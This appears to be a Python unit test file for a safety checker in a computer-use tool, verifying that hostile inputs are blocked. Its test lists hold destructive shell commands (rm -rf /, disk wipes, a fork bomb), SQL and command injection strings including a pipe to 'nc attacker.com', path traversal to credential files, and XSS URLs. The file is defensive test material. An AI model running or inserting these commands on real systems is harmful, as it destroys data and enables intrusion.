#!/usr/bin/env python3
"""
Test safety checks for computer-use-mcp
"""

import sys
import os
import unittest

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'src'))

from safety_checks import SafetyChecker

class TestSafetyChecker(unittest.TestCase):
    """Test safety validation functionality"""
    
    def setUp(self):
        """Setup test fixtures"""
        self.safety = SafetyChecker()
    
    def test_dangerous_commands_blocked(self):
        """Test dangerous system commands are blocked"""
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            "format c:",
            "del /f /s /q *",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod -R 777 /",
            "chown -R nobody:nobody /",
            "> /dev/sda",
            "mkfs.ext4 /dev/sda",
        ]
        
        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                self.assertFalse(
                    self.safety.check_text_safety(cmd),
                    f"Dangerous command not blocked: {cmd}"
                )
    
    def test_credential_detection(self):
        """Test credential and secret detection"""
        texts_with_credentials = [
            "my password is secret123",
            "API_KEY=sk-1234567890abcdef",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "private_key='-----BEGIN RSA PRIVATE KEY-----'",
            "token: ghp_1234567890abcdefghijklmnopqrstuvwxyz",
            "mysql://user:password@localhost/db",
            "mongodb+srv://user:pass@cluster.mongodb.net",
        ]
        
        for text in texts_with_credentials:
            with self.subTest(text=text[:30]):
                self.assertFalse(
                    self.safety.check_text_safety(text),
                    f"Credential not detected: {text[:30]}..."
                )
    
    def test_pii_detection(self):
        """Test PII (Personally Identifiable Information) detection"""
        pii_texts = [
            "SSN: 123-45-6789",
            "Social Security: 123 45 6789",
            "Credit Card: 4532-1234-5678-9012",
            "CC: 4532 1234 5678 9012",
            "Phone: +1-555-123-4567",
            "Email: sensitive@private.com",
        ]
        
        for text in pii_texts:
            with self.subTest(text=text):
                # Note: Implementation may vary on PII handling
                result = self.safety.check_text_safety(text)
                # PII might be allowed with warnings
                self.assertIsNotNone(result)
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        unsafe_paths = [
            "../../etc/passwd",
            "../../../etc/shadow",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\sam",
            "/proc/self/environ",
            "/var/log/auth.log",
        ]
        
        for path in unsafe_paths:
            with self.subTest(path=path):
                self.assertFalse(
                    self.safety.check_text_safety(path),
                    f"Path traversal not blocked: {path}"
                )
    
    def test_url_validation(self):
        """Test URL scheme validation"""
        unsafe_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "file:///etc/passwd",
            "ftp://anonymous:password@ftp.site.com",
            "vbscript:msgbox('XSS')",
        ]
        
        for url in unsafe_urls:
            with self.subTest(url=url):
                self.assertFalse(
                    self.safety.check_text_safety(url),
                    f"Unsafe URL not blocked: {url}"
                )
    
    def test_safe_text_allowed(self):
        """Test safe text is allowed"""
        safe_texts = [
            "Hello, World!",
            "Click the submit button",
            "Type your name",
            "Open settings",
            "Save document",
            "https://example.com",
            "user@example.com",
            "README.md",
            "python script.py",
            "npm install",
        ]
        
        for text in safe_texts:
            with self.subTest(text=text):
                self.assertTrue(
                    self.safety.check_text_safety(text),
                    f"Safe text blocked: {text}"
                )
    
    def test_sql_injection_prevention(self):
        """Test SQL injection pattern detection"""
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users WHERE 1=1;",
        ]
        
        for sql in sql_injections:
            with self.subTest(sql=sql):
                self.assertFalse(
                    self.safety.check_text_safety(sql),
                    f"SQL injection not blocked: {sql}"
                )
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        command_injections = [
            "test; cat /etc/passwd",
            "test && rm -rf /",
            "test | nc attacker.com 1234",
            "test`whoami`",
            "test$(whoami)",
            "test\nrm -rf /",
        ]
        
        for cmd in command_injections:
            with self.subTest(cmd=cmd):
                self.assertFalse(
                    self.safety.check_text_safety(cmd),
                    f"Command injection not blocked: {cmd}"
                )
    
    def test_unicode_bypass_attempts(self):
        """Test Unicode bypass attempts are caught"""
        unicode_attempts = [
            "rm\u202e-rf /",  # Right-to-left override
            "rm\u00a0-rf /",  # Non-breaking space
            "rm\ufeff-rf /",  # Zero-width no-break space
        ]
        
        for text in unicode_attempts:
            with self.subTest(text=repr(text)):
                self.assertFalse(
                    self.safety.check_text_safety(text),
                    f"Unicode bypass not caught: {repr(text)}"
                )
    
    def test_case_insensitive_detection(self):
        """Test case-insensitive dangerous pattern detection"""
        case_variants = [
            "RM -RF /",
            "Rm -Rf /",
            "FORMAT C:",
            "Format c:",
            "DeLeTe /",
        ]
        
        for text in case_variants:
            with self.subTest(text=text):
                self.assertFalse(
                    self.safety.check_text_safety(text),
                    f"Case variant not caught: {text}"
                )
    
    def test_whitelist_override(self):
        """Test whitelist can override safety checks"""
        safety_with_whitelist = SafetyChecker(
            whitelist=["test_command", "safe_script.sh"]
        )
        
        # Whitelisted items should pass
        self.assertTrue(safety_with_whitelist.check_text_safety("test_command"))
        self.assertTrue(safety_with_whitelist.check_text_safety("safe_script.sh"))
        
        # Non-whitelisted dangerous items should still fail
        self.assertFalse(safety_with_whitelist.check_text_safety("rm -rf /"))
    
    def test_custom_patterns(self):
        """Test custom danger patterns can be added"""
        custom_safety = SafetyChecker(
            custom_patterns=["FORBIDDEN", "BLOCKED"]
        )
        
        self.assertFalse(custom_safety.check_text_safety("This is FORBIDDEN"))
        self.assertFalse(custom_safety.check_text_safety("BLOCKED content"))
        self.assertTrue(custom_safety.check_text_safety("This is safe"))
    
    def test_empty_and_none_input(self):
        """Test handling of empty and None input"""
        self.assertTrue(self.safety.check_text_safety(""))
        self.assertTrue(self.safety.check_text_safety(None))
    
    def test_performance_with_large_text(self):
        """Test performance with large text input"""
        import time
        
        large_text = "safe text " * 10000  # 90KB of text
        
        start = time.time()
        result = self.safety.check_text_safety(large_text)
        duration = time.time() - start
        
        self.assertTrue(result)
        self.assertLess(duration, 1.0, "Safety check took too long")

class TestSafetyIntegration(unittest.TestCase):
    """Test safety integration with other components"""
    
    def test_safety_with_computer_use(self):
        """Test safety checks integrate with computer use operations"""
        from computer_use_core import ComputerUseCore
        
        core = ComputerUseCore(test_mode=True)
        
        # Safe operation should work
        result = core.type_text("Hello, World!")
        self.assertIn("success", str(result).lower())
        
        # Dangerous operation should be blocked
        with self.assertRaises(Exception):
            core.type_text("rm -rf /")

if __name__ == "__main__":
    unittest.main()